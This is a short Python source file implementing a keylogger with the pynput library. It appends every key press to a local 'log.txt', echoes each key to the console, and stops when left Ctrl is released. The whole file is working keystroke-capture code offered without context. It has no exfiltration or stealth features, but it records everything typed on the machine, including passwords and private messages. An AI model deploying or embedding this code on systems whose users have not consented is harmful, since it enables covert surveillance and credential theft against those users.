from pynput.keyboard import Listener, Key


def key_logger(key):   

    key = str(key).replace("'","")
    
    with open("log.txt", "a") as f:
        f.write(key) 
        f.write("\n")

    print(key)

def on_release(key):
    
    if key == Key.ctrl_l:
        return False    


with Listener(on_press=key_logger, on_release=on_release) as listener:
    listener.join()
